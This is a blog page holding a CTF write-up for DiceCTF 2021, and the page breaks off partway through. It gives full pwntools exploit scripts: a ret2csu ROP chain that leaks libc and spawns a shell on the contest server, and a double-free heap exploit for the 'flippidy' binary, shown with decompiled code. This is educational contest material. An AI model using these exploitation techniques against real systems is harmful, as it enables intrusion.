<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="Anemone ">
<meta name="description" content="Introduction This is a small write up and recurrence for 2021DiceCTF.
Pwn babyrop Analysis Just a stack overflow and use csu to solve it. Notice that some registers are different for csu.
Exp from pwn import * context.log_level = &amp;#34;debug&amp;#34; context.terminal = [&amp;#39;tmux&amp;#39;, &amp;#39;splitw&amp;#39;, &amp;#39;-h&amp;#39;] LOCAL = 0 DEBUG = 0 if LOCAL: r = process(&amp;#34;./babyrop&amp;#34;) libc = ELF(&amp;#34;/lib/x86_64-linux-gnu/libc.so.6&amp;#34;) write_offset = libc.sym[&amp;#34;write&amp;#34;] system_offset = libc.sym[&amp;#34;execve&amp;#34;] else: r = remote(&amp;#34;dicec.tf&amp;#34;,31924) write_offset = 0x1111d0 system_offset = 0xe62f0 if DEBUG: gdb." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://vergissmeinnichtz.github.io/posts/2021dicectf-writeup/" />


    <title>
        
            2021DiceCTF-WriteUp :: Anemone&#39;s Blog  — A simple theme for Hugo
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.d7bdd8ee18bfbf4c605488a7e5b1b92cd980dfeed2bdaeab4dd5e931a7a78bc0.css">






<meta itemprop="name" content="2021DiceCTF-WriteUp">
<meta itemprop="description" content="Introduction This is a small write up and recurrence for 2021DiceCTF.
Pwn babyrop Analysis Just a stack overflow and use csu to solve it. Notice that some registers are different for csu.
Exp from pwn import * context.log_level = &#34;debug&#34; context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] LOCAL = 0 DEBUG = 0 if LOCAL: r = process(&#34;./babyrop&#34;) libc = ELF(&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;) write_offset = libc.sym[&#34;write&#34;] system_offset = libc.sym[&#34;execve&#34;] else: r = remote(&#34;dicec.tf&#34;,31924) write_offset = 0x1111d0 system_offset = 0xe62f0 if DEBUG: gdb.">
<meta itemprop="datePublished" content="2021-02-08T00:00:00+00:00" />
<meta itemprop="dateModified" content="2021-02-08T00:00:00+00:00" />
<meta itemprop="wordCount" content="4538">
<meta itemprop="image" content="https://vergissmeinnichtz.github.io/"/>



<meta itemprop="keywords" content="" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://vergissmeinnichtz.github.io/"/>

<meta name="twitter:title" content="2021DiceCTF-WriteUp"/>
<meta name="twitter:description" content="Introduction This is a small write up and recurrence for 2021DiceCTF.
Pwn babyrop Analysis Just a stack overflow and use csu to solve it. Notice that some registers are different for csu.
Exp from pwn import * context.log_level = &#34;debug&#34; context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] LOCAL = 0 DEBUG = 0 if LOCAL: r = process(&#34;./babyrop&#34;) libc = ELF(&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;) write_offset = libc.sym[&#34;write&#34;] system_offset = libc.sym[&#34;execve&#34;] else: r = remote(&#34;dicec.tf&#34;,31924) write_offset = 0x1111d0 system_offset = 0xe62f0 if DEBUG: gdb."/>




    <meta property="og:title" content="2021DiceCTF-WriteUp" />
<meta property="og:description" content="Introduction This is a small write up and recurrence for 2021DiceCTF.
Pwn babyrop Analysis Just a stack overflow and use csu to solve it. Notice that some registers are different for csu.
Exp from pwn import * context.log_level = &#34;debug&#34; context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] LOCAL = 0 DEBUG = 0 if LOCAL: r = process(&#34;./babyrop&#34;) libc = ELF(&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;) write_offset = libc.sym[&#34;write&#34;] system_offset = libc.sym[&#34;execve&#34;] else: r = remote(&#34;dicec.tf&#34;,31924) write_offset = 0x1111d0 system_offset = 0xe62f0 if DEBUG: gdb." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://vergissmeinnichtz.github.io/posts/2021dicectf-writeup/" />
<meta property="og:image" content="https://vergissmeinnichtz.github.io/"/>
<meta property="article:published_time" content="2021-02-08T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-02-08T00:00:00+00:00" /><meta property="og:site_name" content="Anemone&#39;s Blog" />




    <meta property="article:section" content="WriteUp" />

    <meta property="article:section" content="Pwn" />

    <meta property="article:section" content="Crypto" />



    <meta property="article:published_time" content="2021-02-08 00:00:00 &#43;0000 UTC" />








    </head>

    
        <body>
    
    
        <div class="container">
            <script type="text/javascript"
        async
        src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [['$','$'], ['\\(','\\)']],
    displayMath: [['$$','$$'], ['\[\[','\]\]']],
    processEscapes: true,
    processEnvironments: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
    TeX: { equationNumbers: { autoNumber: "AMS" },
         extensions: ["AMSmath.js", "AMSsymbols.js"] }
  }
});

MathJax.Hub.Queue(function() {
    
    
    
    var all = MathJax.Hub.getAllJax(), i;
    for(i = 0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
    }
});
</script>

<style>
code.has-jax {
    font: inherit;
    font-size: 100%;
    background: inherit;
    border: inherit;
    color: #515151;
}
</style>

<header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text">$ cd /home/anemone</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/posts">Blog</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        22 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="https://vergissmeinnichtz.github.io/posts/2021dicectf-writeup/">2021DiceCTF-WriteUp</a>
      </h1>

      

      

      <div class="post-content">
        <h2 id="introduction">Introduction</h2>
<p>This is a small write up and recurrence for 2021DiceCTF.</p>
<h2 id="pwn">Pwn</h2>
<h3 id="babyrop">babyrop</h3>
<h4 id="analysis">Analysis</h4>
<p>Just a stack overflow and use csu to solve it. Notice that some registers are different for <a href="https://ctf-wiki.org/pwn/linux/stackoverflow/medium-rop/#ret2csu">csu</a>.</p>
<h4 id="exp">Exp</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-h&#39;</span>]

LOCAL <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
DEBUG <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#66d9ef">if</span> LOCAL:
    r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./babyrop&#34;</span>)
    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>)
    write_offset <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;write&#34;</span>]
    system_offset <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;execve&#34;</span>]
<span style="color:#66d9ef">else</span>:
    r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;dicec.tf&#34;</span>,<span style="color:#ae81ff">31924</span>)   
    write_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1111d0</span> 
    system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xe62f0</span>

<span style="color:#66d9ef">if</span> DEBUG:
    gdb<span style="color:#f92672">.</span>attach(r,<span style="color:#e6db74">&#34;b *0x40116B&#34;</span>)

elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./babyrop&#39;</span>)
main_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401136</span>
write_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;write&#39;</span>]
gets_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;gets&#39;</span>]
csu_front_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011B0</span>
csu_end_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4011CA</span>
bss <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404038</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">csu</span>(rbx, rbp, r12, r13, r14, r15, last, offset):
    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> offset <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;b&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span>
    payload <span style="color:#f92672">+=</span> p64(csu_end_addr) <span style="color:#f92672">+</span> p64(rbx) <span style="color:#f92672">+</span> p64(rbp) <span style="color:#f92672">+</span> p64(r12) <span style="color:#f92672">+</span> p64(r13) <span style="color:#f92672">+</span> p64(r14) <span style="color:#f92672">+</span> p64(r15)
    payload <span style="color:#f92672">+=</span> p64(csu_front_addr)
    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x38</span>
    payload <span style="color:#f92672">+=</span> p64(last)
    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Your name: &#34;</span>)
    r<span style="color:#f92672">.</span>sendline(payload)
    sleep(<span style="color:#ae81ff">1</span>)

csu(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>,write_got,<span style="color:#ae81ff">8</span>,write_got,main_addr,<span style="color:#ae81ff">0x40</span>)
write_addr <span style="color:#f92672">=</span> u64(r<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>))
success(<span style="color:#e6db74">&#34;write_addr: &#34;</span> <span style="color:#f92672">+</span> hex(write_addr))
libc_base <span style="color:#f92672">=</span> write_addr <span style="color:#f92672">-</span> write_offset 
success(<span style="color:#e6db74">&#34;libc_base: &#34;</span> <span style="color:#f92672">+</span> hex(libc_base))
system_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> system_offset
csu(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,bss <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">16</span>,gets_got,main_addr,<span style="color:#ae81ff">0x40</span>)
r<span style="color:#f92672">.</span>sendline(p64(system_addr) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
csu(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,bss <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x108</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,bss <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>,main_addr,<span style="color:#ae81ff">0x40</span>)

r<span style="color:#f92672">.</span>interactive()
</code></pre></div><h3 id="flippidy">flippidy</h3>
<p>This writeup is referenced from <a href="https://teamrocketist.github.io/2021/02/08/Pwn-DiceCTF2021-flippidy/">TeamRocketIST</a></p>
<h4 id="analysis-1">Analysis</h4>
<p>This is a no-PIE program.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
</code></pre></div><p>The main function asks for the size of note list. (The <code>8 * size</code> can be overflowed, such as <code>0x20010000</code>, and you can write a heap address to libc or ld, but can&rsquo;t leak anything and keep going&hellip;)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a2, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>a3)
{
  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> choice; <span style="color:#75715e">// [rsp+Ch] [rbp-4h]
</span><span style="color:#75715e"></span>
  setbuf(stdout, <span style="color:#ae81ff">0LL</span>);
  setbuf(stdin, <span style="color:#ae81ff">0LL</span>);
  setbuf(stderr, <span style="color:#ae81ff">0LL</span>);
  welcome();
  printf(<span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#e6db74">&#34;To get started, first tell us how big your notebook will be: &#34;</span>);
  size <span style="color:#f92672">=</span> read_int();
  chunk_head <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> size);
  memset(chunk_head, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> size);
  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
  {
    menu();
    printf(<span style="color:#e6db74">&#34;: &#34;</span>, <span style="color:#ae81ff">0LL</span>);
    choice <span style="color:#f92672">=</span> read_int();
    <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> )
    {
      puts(<span style="color:#e6db74">&#34;Goodbye!&#34;</span>);
      exit(<span style="color:#ae81ff">0</span>);
    }
    <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">3</span> )
    {
LABEL_11:
      puts(<span style="color:#e6db74">&#34;Invalid choice.&#34;</span>);
    }
    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
    {
      add();
    }
    <span style="color:#66d9ef">else</span>
    {
      <span style="color:#66d9ef">if</span> ( choice <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> )
        <span style="color:#66d9ef">goto</span> LABEL_11;
      flip();
    }
  }
}
</code></pre></div><p>Choice 1 can add a 0x30 chunk.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">add</span>()
{
  <span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>v1; <span style="color:#75715e">// rbx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> idx; <span style="color:#75715e">// [rsp+Ch] [rbp-14h]
</span><span style="color:#75715e"></span>
  printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
  idx <span style="color:#f92672">=</span> read_int();
  <span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> idx <span style="color:#f92672">&gt;=</span> size )
    <span style="color:#66d9ef">return</span> puts(<span style="color:#e6db74">&#34;Invalid index.&#34;</span>);
  v1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> idx);
  <span style="color:#f92672">*</span>v1 <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x30uLL</span>);
  printf(<span style="color:#e6db74">&#34;Content: &#34;</span>);
  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)fgets(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)chunk_head <span style="color:#f92672">+</span> idx), <span style="color:#ae81ff">0x30</span>, stdin);
}
</code></pre></div><p>Choice 2 can flip the note list.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">flip</span>()
{
  <span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>v0; <span style="color:#75715e">// rbx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>v1; <span style="color:#75715e">// rbx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> flag1; <span style="color:#75715e">// [rsp+Ah] [rbp-A6h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> flag2; <span style="color:#75715e">// [rsp+Bh] [rbp-A5h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+Ch] [rbp-A4h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> src; <span style="color:#75715e">// [rsp+10h] [rbp-A0h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> dst; <span style="color:#75715e">// [rsp+50h] [rbp-60h]
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v8; <span style="color:#75715e">// [rsp+98h] [rbp-18h]
</span><span style="color:#75715e"></span>
  v8 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> size <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>; <span style="color:#f92672">++</span>i )
  {
    memset(<span style="color:#f92672">&amp;</span>src, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x40uLL</span>);
    memset(<span style="color:#f92672">&amp;</span>dst, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x40uLL</span>);
    flag1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    flag2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> i) )
    {
      strcpy(<span style="color:#f92672">&amp;</span>src, <span style="color:#f92672">*</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)chunk_head <span style="color:#f92672">+</span> i));
      free(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)chunk_head <span style="color:#f92672">+</span> i));
    }
    <span style="color:#66d9ef">else</span>
    {
      flag1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
    }
    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> size <span style="color:#f92672">-</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) )
    {
      strcpy(<span style="color:#f92672">&amp;</span>dst, <span style="color:#f92672">*</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)chunk_head <span style="color:#f92672">+</span> size <span style="color:#f92672">-</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
      free(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)chunk_head <span style="color:#f92672">+</span> size <span style="color:#f92672">-</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
    }
    <span style="color:#66d9ef">else</span>
    {
      flag2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
    }
    <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> i) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
    <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> size <span style="color:#f92672">-</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
    <span style="color:#66d9ef">if</span> ( flag1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
    {
      <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> size <span style="color:#f92672">-</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
    }
    <span style="color:#66d9ef">else</span>
    {
      v0 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> (size <span style="color:#f92672">-</span> i) <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>);
      <span style="color:#f92672">*</span>v0 <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x30uLL</span>);
      strcpy(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)chunk_head <span style="color:#f92672">+</span> size <span style="color:#f92672">-</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>), <span style="color:#f92672">&amp;</span>src);
    }
    <span style="color:#66d9ef">if</span> ( flag2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
    {
      <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> i) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
    }
    <span style="color:#66d9ef">else</span>
    {
      v1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)chunk_head <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> i);
      <span style="color:#f92672">*</span>v1 <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x30uLL</span>);
      strcpy(<span style="color:#f92672">*</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)chunk_head <span style="color:#f92672">+</span> i), <span style="color:#f92672">&amp;</span>dst);
    }
  }
  <span style="color:#66d9ef">return</span> v8 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
}
</code></pre></div><p>If we set size as <code>1</code>, and add a chunk. Then when we flip the note list, there will have a <code>double free</code>. We can use <code>menu</code> to leak libc because it use some pointers to show menu.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">menu</span>()
{
  <span style="color:#66d9ef">int</span> result; <span style="color:#75715e">// eax
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+Ch] [rbp-4h]
</span><span style="color:#75715e"></span>
  result <span style="color:#f92672">=</span> puts(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">3</span>; <span style="color:#f92672">++</span>i )
    result <span style="color:#f92672">=</span> puts(menu_str[i]);
  <span style="color:#66d9ef">return</span> result;
}
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++">.data:<span style="color:#ae81ff">0000000000404020</span> menu_str        dq offset aMenu         ; DATA XREF: menu<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>A<span style="color:#960050;background-color:#1e0010">↑</span>o
.data:<span style="color:#ae81ff">0000000000404020</span>                                         ; <span style="color:#e6db74">&#34;----- Menu -----&#34;</span>
.data:<span style="color:#ae81ff">000000000040402</span><span style="color:#ae81ff">8</span>                 dq offset a1AddToYourNote ; <span style="color:#e6db74">&#34;1. Add to your notebook&#34;</span>
.data:<span style="color:#ae81ff">0000000000404030</span>                 dq offset a2FlipYourNoteb ; <span style="color:#e6db74">&#34;2. Flip your notebook!&#34;</span>
.data:<span style="color:#ae81ff">000000000040403</span><span style="color:#ae81ff">8</span>                 dq offset a3Exit        ; <span style="color:#e6db74">&#34;3. Exit&#34;</span>
.data:<span style="color:#ae81ff">0000000000404040</span> aMenu           db <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">-----</span> Menu <span style="color:#f92672">-----</span><span style="color:#960050;background-color:#1e0010">&#39;</span>,<span style="color:#ae81ff">0</span> ; DATA XREF: .data:menu_str<span style="color:#960050;background-color:#1e0010">↑</span>o
.data:<span style="color:#ae81ff">0000000000404051</span>                 db    <span style="color:#ae81ff">0</span>
</code></pre></div><p>When we have <code>libc base</code>, we can write <code>one gadget</code> to <code>free_hook</code> and getshell.</p>
<h4 id="exp-1">Exp</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-h&#39;</span>]

DEBUG <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>

r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./flippidy&#34;</span>)
elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./flippidy&#34;</span>)
libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc-2.27.so&#34;</span>)
menu_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404020</span>
puts_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;puts&#34;</span>]
chunk_list <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404158</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cmd</span>(idx):
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;: &#34;</span>,str(idx))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(idx,content):
    cmd(<span style="color:#ae81ff">1</span>)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Index: &#34;</span>,str(idx))
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Content: &#34;</span>,content)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">flip</span>():
    cmd(<span style="color:#ae81ff">2</span>)

<span style="color:#66d9ef">if</span> DEBUG:
    gdb<span style="color:#f92672">.</span>attach(r,<span style="color:#e6db74">&#34;b *0x401749&#34;</span>)

size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;To get started, first tell us how big your notebook will be:&#34;</span>)
r<span style="color:#f92672">.</span>sendline(str(size))

add(<span style="color:#ae81ff">0</span>,p64(menu_addr))
flip() <span style="color:#75715e"># double free</span>
payload <span style="color:#f92672">=</span> p64(puts_got) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
payload <span style="color:#f92672">+=</span> p64(chunk_list)
add(<span style="color:#ae81ff">0</span>,payload)
